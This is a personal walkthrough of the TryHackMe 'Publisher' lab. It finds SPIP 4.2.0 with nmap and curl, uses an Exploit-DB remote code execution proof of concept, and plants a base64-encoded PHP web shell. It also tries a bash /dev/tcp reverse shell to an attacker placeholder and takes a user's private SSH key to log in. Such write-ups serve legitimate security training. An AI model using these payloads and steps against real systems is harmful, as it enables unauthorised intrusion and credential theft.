Link : https://tryhackme.com/room/publisher

These modules helps to solve this room

- **Step 1:** Nmap enumeration + CMS identification
- **Step 2:** How to find CMS exploits (CVE, PoC usage)
- **Step 3:** Reverse shells (bash one-liners, netcat listener)
- **Step 4:** Linux Privilege Escalation (SSH keys, SUID, weak file perms)

## Nmap enumeration + CMS identification

```bash
22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0) | 
ssh-hostkey: | 3072 53:92:14:21:ce:bd:6d:75:37:0d:73:16:ff:d1:64:46 (RSA) | 
							 256 4f:06:73:16:e9:b1:24:9b:0e:e4:65:65:8f:42:b9:15 (ECDSA) 
							 |_ 256 a7:00:d4:ec:00:73:46:47:03:27:02:a6:35:04:80:51 (ED25519) 
80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-title: Publisher's Pulse: 
																														SPIP Insights & Tips |
_http-server-header: Apache/2.4.41 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## SPIP → CME

Need to find spip version.

```bash
curl -I http://10.201.77.99/spip/ 
	-> To find datas about spip, or can go to this url and see view source
```

```bash
HTTP/1.1 200 OK
Date: Tue, 26 Aug 2025 03:12:03 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Cookie,Accept-Encoding
Composed-By: **SPIP 4.2.0** @ www.spip.net + http://10.201.77.99/spip/local/config.txt
Link: <http://10.201.77.99/spip/local/cache-css/9188f9f490291ad90a84c517eb17e067.css?1756177929>;rel="preload";as="style";
X-Spip-Cache: 86400
Last-Modified: Tue, 26 Aug 2025 03:12:08 GMT
Connection: close
Content-Type: text/html; charset=utf-8

```

# **SPIP Version : 4.2.0**

We can also check in these folders for spip

- `/spip/README.txt`
- `/spip/CHANGELOG.txt`
    
    ### **`/spip/ecrire/` (SPIP admin)  → Got login page here**
    

We got RCE vulnerability for SPIP 4.2.0 

### [**SPIP v4.2.0: Remote Code Execution (Unauthenticated)**](https://www.exploit-db.com/exploits/51536)

> Remote Code Execution (RCE) is a vulnerability that allows an attacker to **run arbitrary commands or code** on a target system **remotely** (over the network, without physical access).
> 

### 

## Reverse Shell:

Normally in SSH/FTP/TCP we connect to server

In reverse shell → Server(Victim) connects to client

Because firewalls in server won’t allow attackers to make incoming-session. So we trick server to have outgoin session from there to our machine.

In our machine : 

```bash
nc -nvlp 1337 -> wait for anyone to connect to me on port 4444.
```

- ✅ RCE is confirmed (`system('whoami')` worked).
- ✅ `/usr/bin/bash` exists.
- ❌ `nc` not present.
- ❌ `python3` not present.
- ❌ `bash -i >& /dev/tcp/attacker/port 0>&1` did **not** connect.

Current working directory is : **/home/think/spip/spip**

> By below exploit with php code we created a shell.php which will give same output as exploit, but can directly access it from web like http://url/spip/shell.php/cmd=ls
> 

```php
python print_exploit.py -u http://10.201.21.240/spip -c "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /home/think/spip/spip/shell.php"

```

But this doesn’t worked, so I tried to provide base 64 encoded php code → BOOOOOOM (worked)

```python
python print_exploit.py -u http://10.201.21.240/spip -c "echo PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+ | base64 -d > /home/think/spip/spip/shell.php"

```

Tried to encode reverse shell and give, but server doesn’t allow any outbound sessions from server to other clients.

**Just searched other directories where i have permission /home/think and i found user.txt**

### SSH-Penetration:

After cracking my head I found id_rsa in .ssh folder → ls -la /home/think → Private ssh_key

Copied the content and pasted in my machine.

Then tried to find the username by cat /etc/passwd, got username. 

then executed ssh login code

```bash
ssh -i id_rsa think@ip
```

But I got permission error in id_rsa, so I fixed it by 

```bash
chmod 600 id_rsa
```

Now I got ssh-access after bashing my head for 6+ hours.

### Directory Enumeration:

```bash
gobuster dir -u http://10.201.77.99 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,html -t 50 
```

```bash
/index.html           (Status: 200) [Size: 8686]
/images               (Status: 301) [Size: 313] [--> http://10.201.77.99/images/]
/index.html           (Status: 200) [Size: 8686]                                 
/server-status        (Status: 403) [Size: 277]   
```

/server-status is not accessible. Will look upon it later.
